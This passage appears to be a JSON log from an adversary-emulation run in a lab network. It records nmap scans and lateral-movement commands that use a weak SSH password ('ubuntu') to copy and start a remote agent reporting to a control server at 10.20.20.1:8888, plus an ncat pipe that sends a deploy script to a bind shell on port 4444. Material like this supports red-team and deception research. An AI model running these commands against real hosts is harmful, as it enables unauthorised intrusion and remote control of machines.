"host.remote.ports['22', '4444']", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '4444'])", "host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '4444'])", "host.remote.ip(192.168.201.3) : has_open_ports : host.remote.ports(['22', '4444'])"]}, {"trait": "host.remote.ip", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.6) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.200.6) : has_port_services : host.remote.port_services([('22', 'ssh')])"]}, {"trait": "host.remote.ip", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.7) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.200.7) : has_port_services : host.remote.port_services([('22', 'ssh')])"]}, {"trait": "host.remote.ip", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.156", "unique": "host.remote.ip192.168.200.156", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.156) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.156) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ports", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "2b3de1b9-7a7c-45a7-9730-fdd10f68503a", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c", "b49ae41b-bf75-471a-b8d6-81ae2b9ce2dd"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.156) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.201.91) : has_open_ports : host.remote.ports(['22', '8000'])"]}, {"trait": "host.remote.ip", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '4444'])", "host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])"]}, {"trait": "host.remote.port_services", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh')]", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh')])", "host.remote.ip(192.168.200.6) : has_port_services : host.remote.port_services([('22', 'ssh')])", "host.remote.ip(192.168.200.7) : has_port_services : host.remote.port_services([('22', 'ssh')])"]}, {"trait": "host.remote.port_services", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "2b3de1b9-7a7c-45a7-9730-fdd10f68503a", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c", "b49ae41b-bf75-471a-b8d6-81ae2b9ce2dd"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"], ["4444", "krb524"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524')]", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])", "host.remote.ip(192.168.201.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])"]}, {"trait": "host.remote.port_services", "links": ["2a471089-0473-4d7b-9aa1-84e009b342b2", "2b3de1b9-7a7c-45a7-9730-fdd10f68503a", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c", "b49ae41b-bf75-471a-b8d6-81ae2b9ce2dd"], "collected_by": ["rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-09T22:23:04Z", "relationships": ["host.remote.ip(192.168.200.156) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])", "host.remote.ip(192.168.201.91) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:22:37Z"}, {"deadman": false, "finish": "2023-10-09T22:23:21Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "2b3de1b9-7a7c-45a7-9730-fdd10f68503a", "plaintext_command": "nmap -sV --version-light -oX - 192.168.201.3,91", "used": [{"trait": "scan.remote.addr", "links": [], "collected_by": [], "score": 5, "limit_count": -1, "name": "scan.remote.addr", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.3,91", "unique": "scan.remote.addr192.168.201.3,91", "created": "2023-10-09T22:23:08Z", "relationships": []}], "unique": "2b3de1b9-7a7c-45a7-9730-fdd10f68503a", "decide": "2023-10-09T22:23:08Z", "status": 0, "score": 1, "pid": "1180", "relationships": [{"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22", "4444"], "unique": "host.remote.ports['22', '4444']", "created": "2023-10-09T22:23:21Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.3", "unique": "host.remote.ip192.168.201.3", "created": "2023-10-09T22:23:21Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71aee6b00>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a361a50>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-09T22:23:21Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.91", "unique": "host.remote.ip192.168.201.91", "created": "2023-10-09T22:23:21Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a362110>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a362530>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"], ["4444", "krb524"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524')]", "created": "2023-10-09T22:23:21Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.3", "unique": "host.remote.ip192.168.201.3", "created": "2023-10-09T22:23:21Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a363c10>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a362950>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-09T22:23:21Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.91", "unique": "host.remote.ip192.168.201.91", "created": "2023-10-09T22:23:21Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a361000>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a362e60>", "score": 1}], "host": "activedir-host", "pin": 0, "paw": "rkzyad", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmap", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-09T22:23:09Z", "command": "nmap -sV --version-light -oX - 192.168.201.3,91", "facts": [{"trait": "host.remote.ip", "links": ["2b3de1b9-7a7c-45a7-9730-fdd10f68503a", "b49ae41b-bf75-471a-b8d6-81ae2b9ce2dd"], "collected_by": ["rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.3", "unique": "host.remote.ip192.168.201.3", "created": "2023-10-09T22:23:21Z", "relationships": ["host.remote.ip(192.168.201.3) : has_open_ports : host.remote.ports(['22', '4444'])", "host.remote.ip(192.168.201.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])"]}, {"trait": "host.remote.ports", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "2b3de1b9-7a7c-45a7-9730-fdd10f68503a", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c", "b49ae41b-bf75-471a-b8d6-81ae2b9ce2dd"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22", "4444"], "unique": "host.remote.ports['22', '4444']", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '4444'])", "host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '4444'])", "host.remote.ip(192.168.201.3) : has_open_ports : host.remote.ports(['22', '4444'])"]}, {"trait": "host.remote.ip", "links": ["2b3de1b9-7a7c-45a7-9730-fdd10f68503a", "b49ae41b-bf75-471a-b8d6-81ae2b9ce2dd"], "collected_by": ["rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.91", "unique": "host.remote.ip192.168.201.91", "created": "2023-10-09T22:23:21Z", "relationships": ["host.remote.ip(192.168.201.91) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.201.91) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ports", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "2b3de1b9-7a7c-45a7-9730-fdd10f68503a", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c", "b49ae41b-bf75-471a-b8d6-81ae2b9ce2dd"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.156) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.201.91) : has_open_ports : host.remote.ports(['22', '8000'])"]}, {"trait": "host.remote.port_services", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "2b3de1b9-7a7c-45a7-9730-fdd10f68503a", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c", "b49ae41b-bf75-471a-b8d6-81ae2b9ce2dd"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"], ["4444", "krb524"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524')]", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])", "host.remote.ip(192.168.201.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])"]}, {"trait": "host.remote.port_services", "links": ["2a471089-0473-4d7b-9aa1-84e009b342b2", "2b3de1b9-7a7c-45a7-9730-fdd10f68503a", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c", "b49ae41b-bf75-471a-b8d6-81ae2b9ce2dd"], "collected_by": ["rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-09T22:23:04Z", "relationships": ["host.remote.ip(192.168.200.156) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])", "host.remote.ip(192.168.201.91) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:23:09Z"}, {"deadman": false, "finish": "2023-10-09T22:23:29Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "c7bcd462-cf6b-4444-8811-1c74df27f5b4", "plaintext_command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux database@192.168.201.3:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 database@192.168.201.3 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "used": [{"trait": "host.lateralMove.password", "links": [], "collected_by": ["rkzyad"], "score": 1, "limit_count": -1, "name": "host.lateralMove.password", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "ubuntu", "unique": "host.lateralMove.passwordubuntu", "created": "2023-10-09T22:23:23Z", "relationships": []}, {"trait": "host.lateralMove.user", "links": [], "collected_by": ["rkzyad"], "score": 1, "limit_count": -1, "name": "host.lateralMove.user", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "database", "unique": "host.lateralMove.userdatabase", "created": "2023-10-09T22:23:23Z", "relationships": []}, {"trait": "host.lateralMove.ip", "links": [], "collected_by": ["rkzyad"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.3", "unique": "host.lateralMove.ip192.168.201.3", "created": "2023-10-09T22:23:23Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["rkzyad"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "22", "unique": "host.lateralMove.port22", "created": "2023-10-09T22:23:23Z", "relationships": []}], "unique": "c7bcd462-cf6b-4444-8811-1c74df27f5b4", "decide": "2023-10-09T22:23:23Z", "status": 1, "score": 15, "pid": "1182", "relationships": [], "host": "activedir-host", "pin": 0, "paw": "rkzyad", "output": "True", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ssh", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T1021.004", "name": "Deception copy and start agent over ssh", "description": "Copy 54ndc47 to remote host and start it, assumes target uses password enabled SSH", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: SSH"}, "agent_reported_time": "2023-10-09T22:23:26Z", "command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux database@192.168.201.3:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 database@192.168.201.3 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "facts": [{"trait": "host.ip.address", "links": ["c7bcd462-cf6b-4444-8811-1c74df27f5b4"], "collected_by": ["rkzyad"], "score": 1, "limit_count": -1, "name": "host.ip.address", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.3", "unique": "host.ip.address192.168.201.3", "created": "2023-10-09T22:23:29Z", "relationships": []}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:23:26Z"}, {"deadman": false, "finish": "2023-10-09T22:23:42Z", "executor": {"additional_info": {}, "timeout": 30, "variations": [], "payloads": ["runDeployAgent.sh"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "{ echo \"server=#{server}\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s #{host.lateralMove.ip} #{host.lateralMove.port}", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "47b469bb-45be-4034-9872-da90ca6349ea", "plaintext_command": "{ echo \"server=http://10.20.20.1:8888\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s 192.168.201.3 4444", "used": [{"trait": "host.lateralMove.ip", "links": [], "collected_by": ["rkzyad"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.3", "unique": "host.lateralMove.ip192.168.201.3", "created": "2023-10-09T22:23:33Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["rkzyad"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "4444", "unique": "host.lateralMove.port4444", "created": "2023-10-09T22:23:33Z", "relationships": []}], "unique": "47b469bb-45be-4034-9872-da90ca6349ea", "decide": "2023-10-09T22:23:33Z", "status": 1, "score": 3, "pid": "1186", "relationships": [], "host": "activedir-host", "pin": 0, "paw": "rkzyad", "output": "True", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ncshell", "executors": [{"additional_info": {}, "timeout": 30, "variations": [], "payloads": ["runDeployAgent.sh"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "{ echo \"server=#{server}\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s #{host.lateralMove.ip} #{host.lateralMove.port}", "platform": "linux", "parsers": [], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": true, "repeatable": false, "technique_id": "T9090", "name": "Deception download agent on target through netcat bind shell", "description": "download sandcat agent on a target machine that is listening on a netcat bind shell", "plugin": "deception", "requirements": [], "buckets": ["deception-lateral-movement"], "technique_name": "Remote Services: Netcat Bind Shell"}, "agent_reported_time": "2023-10-09T22:23:36Z", "command": "{ echo \"server=http://10.20.20.1:8888\"; cat runDeployAgent.sh; } | ncat --no-shutdown -i 5s 192.168.201.3 4444", "facts": [], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:23:36Z"}, {"deadman": false, "finish": "2023-10-09T22:23:45Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "5a0287a7-b2dd-466e-a2df-78ae1c5bbcbd", "plaintext_command": "sshpass -p \"ubuntu\" scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux ubuntu@192.168.201.91:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 ubuntu@192.168.201.91 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "used": [{"trait": "host.lateralMove.password", "links": [], "collected_by": ["rkzyad"], "score": 1, "limit_count": -1, "name": "host.lateralMove.password", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "ubuntu", "unique": "host.lateralMove.passwordubuntu", "created": "2023-10-09T22:23:43Z", "relationships": []}, {"trait": "host.lateralMove.user", "links": [], "collected_by": ["rkzyad"], "score": 1, "limit_count": -1, "name": "host.lateralMove.user", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "ubuntu", "unique": "host.lateralMove.userubuntu", "created": "2023-10-09T22:23:43Z", "relationships": []}, {"trait": "host.lateralMove.ip", "links": [], "collected_by": ["rkzyad"], "score": 1, "limit_count": -1, "name": "host.lateralMove.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.91", "unique": "host.lateralMove.ip192.168.201.91", "created": "2023-10-09T22:23:43Z", "relationships": []}, {"trait": "host.lateralMove.port", "links": [], "collected_by": ["rkzyad"], "score": 1, "limit_count": -1, "name": "host.lateralMove.port", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "22", "unique": "host.lateralMove.port22", "created": "2023-10-09T22:23:43Z", "relationships": []}], "unique": "5a0287a7-b2dd-466e-a2df-78ae1c5bbcbd", "decide": "2023-10-09T22:23:43Z", "status": 1, "score": 15, "pid": "1189", "relationships": [], "host": "activedir-host", "pin": 0, "paw": "rkzyad", "output": "True", "ability": {"tactic": "deception-lateral-movement", "ability_id": "deception-ssh", "executors": [{"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o 